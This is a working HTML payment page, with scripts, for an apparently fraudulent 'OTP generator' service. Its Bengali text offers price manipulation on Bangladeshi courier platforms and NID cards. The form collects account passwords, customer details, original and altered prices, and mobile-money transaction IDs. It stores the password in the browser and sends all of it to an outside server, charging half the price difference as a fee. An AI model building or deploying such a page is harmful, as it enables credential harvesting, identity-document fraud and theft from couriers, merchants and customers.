<!DOCTYPE HTML>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <title>Payment Page</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
  <link rel="stylesheet" href="./assets/css/main.css">
  <script src="./navbar.js"></script>
</head>
<body class="is-preload">
  <div id="bg"></div>
  <h1>Otp Generator Payment Page</h1>

  <header id="header">
    <h3>Server Payment</h3>
    <p>
      পেমেন্ট কনফার্ম করে দয়াকরে অপেক্ষা করুন।
      স্ট্যাটাস দেখতে Dashboard চেক করুন।
      আপনার কাজ না হলে ৩-৬ ঘণ্টার মধ্যে আপনার পেমেন্ট রিটার্ন করে দেওয়া হবে।
      হেল্পলাইনঃ 01568760780 (WhatsApp)
    </p>
  </header>

  <section>
    <h3>Service & Payment Details</h3>

    <form id="payment-form">
      <label for="company">Company:</label>
      <select id="company" name="company" required>
        <option value="">Select Company</option>
        <option value="govt_nid">Govt NID</option>
        <option value="redx">RedX</option>
        <option value="pathao">Pathao</option>
        <option value="steadfast">SteadFast</option>
      </select><br>

      <label for="phone">Your Phone Number:</label>
      <input type="tel" id="phone" name="phone" required 
             pattern="\d{11}" 
             title="11-digit phone number">
      <br><br>

      <label for="password">NID/App Password:</label>
      <input type="password" id="password" name="password" required minlength="6">
      <br><br>

      <label for="serviceType">Service Type:</label>
      <select id="serviceType" name="serviceType" required>
        <option value="">Select Service</option>
        <option value="pricecng">Price Change</option>
        <option value="partial">Partial</option>
        <option value="nid">NID</option>
      </select><br><br>

      <label for="name">NID/Customer Name:</label>
      <input type="text" id="name" name="name" required>
      <br><br>

      <label for="phone1">Customer Phone Number:</label>
      <input type="tel" id="phone1" name="phone1" required 
             pattern="\d{11}" 
             title="11-digit phone number">
      <br><br>

      <label for="amount1">Amount:</label>
      <input type="number" id="amount1" name="amount1" required min="100" max="100000" step="1">
      <p>পণ্যের মূল্য</p>

      <label for="amount2">Updated Amount:</label>
      <input type="number" id="amount2" name="amount2" required min="100" max="100000" step="1">
      <p>পরিবর্তিত মূল্য</p>

      <label for="method">Payment Method:</label>
      <select id="method" name="method" required>
        <option value="">Select Method</option>
        <option value="Bkash">Bkash</option>
        <option value="Nagad">Nagad</option>
      </select><br><br>

      <label for="amount3">Server Charge:</label>
      <input type="number" id="amount3" name="amount3" readonly required>
      <p>কার্য সম্পাদনের জন্য সার্ভারচার্জ প্রদত্ত বিকাশ নাম্বারে অগ্রিম পরিশোধ করুন</p>
      
      <label for="trxid">TRX ID:</label>
      <input type="text" id="trxid" name="trxid" required minlength="8">
      <br><br><br><br>

      <button type="submit">Confirm Payment</button>
      <br><br>

      <button type="button" id="cancelBtn" class="button">
        Cancel & Clear
      </button>
    </form>

    <div id="confirmation-message" style="margin-top: 20px;"></div>
  </section>

  <footer>
    <p>
      প্রতিটি এন আই ডি কার্ডের জন্য সর্বনিম্ন চার্জ ১০০০টাকা।
      অন্যান্য প্রাইস ম্যানুপুলেশান সার্ভিস গুলোর ক্ষেত্রে
      সার্ভারচার্জ আগেই পরিশোধ করতে হবে। নতুবা Ai জেনেরাটর চালু করা সম্ভব হবে না।
      এনআইডি কার্ড ছাড়া অন্যান্য সার্ভিস গুলোর ক্ষেত্রে
      দৈনিক ৫০টি ফ্রি সার্ভিস দেওয়া হবে এজন্য প্রদত্ত Whatsapp নাম্বারে টেক্সট করুন। প্রদত্ত নাম্বার ছাড়া অন্য কোন নাম্বারে যোগাযোগ করে কোন প্রতারণার
      শিকার হলে তার জন্য One1 কোনভাবেই দায়ী নয়।<br>Grate power comes with great responsibility,<br>So use it for ethical perposes only.
    </p>
  </footer>

  <script>
    // Simple 11-digit phone validation
    function validatePhone(phone) {
      const digitsOnly = phone.replace(/\D/g, '');
      return digitsOnly.length === 11;
    }

    // Calculate server charge automatically
    function calculateCharge() {
      const val1 = parseFloat(document.getElementById('amount1').value) || 0;
      const val2 = parseFloat(document.getElementById('amount2').value) || 0;
      const charge = ((val1 - val2) / 2).toFixed(2);
      document.getElementById('amount3').value = charge > 0 ? charge : 0;
    }

    // Save form data to localStorage
    function saveFormData() {
      const formData = {
        company: document.getElementById('company').value,
        phone: document.getElementById('phone').value,
        password: document.getElementById('password').value,
        serviceType: document.getElementById('serviceType').value,
        name: document.getElementById('name').value,
        phone1: document.getElementById('phone1').value,
        amount1: document.getElementById('amount1').value,
        amount2: document.getElementById('amount2').value,
        method: document.getElementById('method').value,
        trxid: document.getElementById('trxid').value
      };
      localStorage.setItem('paymentFormData', JSON.stringify(formData));
    }

    // Load form data from localStorage
    function loadFormData() {
      const savedData = localStorage.getItem('paymentFormData');
      if (savedData) {
        const formData = JSON.parse(savedData);
        document.getElementById('company').value = formData.company || '';
        document.getElementById('phone').value = formData.phone || '';
        document.getElementById('password').value = formData.password || '';
        document.getElementById('serviceType').value = formData.serviceType || '';
        document.getElementById('name').value = formData.name || '';
        document.getElementById('phone1').value = formData.phone1 || '';
        document.getElementById('amount1').value = formData.amount1 || '';
        document.getElementById('amount2').value = formData.amount2 || '';
        document.getElementById('method').value = formData.method || '';
        document.getElementById('trxid').value = formData.trxid || '';
        calculateCharge();
      }
    }

    document.addEventListener('DOMContentLoaded', () => {
      // Load saved form data
      loadFormData();

      // Setup calculation listeners
      document.getElementById('amount1').addEventListener('input', calculateCharge);
      document.getElementById('amount2').addEventListener('input', calculateCharge);
      
      // Setup input listeners to save form data
      const inputs = document.querySelectorAll('#payment-form input, #payment-form select');
      inputs.forEach(input => {
        input.addEventListener('input', saveFormData);
        input.addEventListener('change', saveFormData);
      });
      
      // Cancel button functionality
      document.getElementById('cancelBtn').addEventListener('click', () => {
        localStorage.removeItem('paymentFormData');
        document.getElementById('payment-form').reset();
        document.getElementById('confirmation-message').innerHTML = '';
        document.getElementById('amount3').value = '';
      });

      // Form submission handler
      document.getElementById('payment-form').addEventListener('submit', async (e) => {
        e.preventDefault();
        
        // Check if user is logged in
        const token = localStorage.getItem('token');
        if (!token) {
          alert('Please login first!');
          window.location.href = 'login.html';
          return;
        }

        // Get form values
        const phone = document.getElementById('phone').value;
        const phone1 = document.getElementById('phone1').value;

        // Validate phone numbers
        if (!validatePhone(phone) || !validatePhone(phone1)) {
          alert('Please enter valid 11-digit phone numbers');
          return;
        }

        // Prepare payment data
        const paymentData = {
          company: document.getElementById('company').value,
          phone: phone.replace(/\D/g, ''),
          password: document.getElementById('password').value,
          serviceType: document.getElementById('serviceType').value,
          name: document.getElementById('name').value,
          phone1: phone1.replace(/\D/g, ''),
          amount1: parseFloat(document.getElementById('amount1').value),
          amount2: parseFloat(document.getElementById('amount2').value),
          amount3: parseFloat(document.getElementById('amount3').value),
          method: document.getElementById('method').value,
          trxid: document.getElementById('trxid').value
        };

        try {
          const response = await fetch('https://otpgen-84pg.onrender.com/payment', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
              'Authorization': `Bearer ${token}`
            },
            body: JSON.stringify(paymentData)
          });

          const result = await response.json();

          if (response.ok) {
            document.getElementById('confirmation-message').innerHTML = `
              <p style="color: green;">✅ Payment submitted successfully!</p>
            `;
            // Clear saved data and form
            localStorage.removeItem('paymentFormData');
            document.getElementById('payment-form').reset();
            document.getElementById('amount3').value = '';
            
            // Redirect after 2 seconds
            setTimeout(() => {
              window.location.href = 'dashboard.html';
            }, 2000);
          } else {
            document.getElementById('confirmation-message').innerHTML = `
              <p style="color: red;">❌x ${result.message || 'Payment failed'}</p>
            `;
          }
        } catch (error) {
          console.error('Payment error:', error);
          document.getElementById('confirmation-message').innerHTML = `
            <p style="color: red;">❌ Network error. Please try again.</p>
          `;
        }
      });
    });
  </script>
</body>
</html>
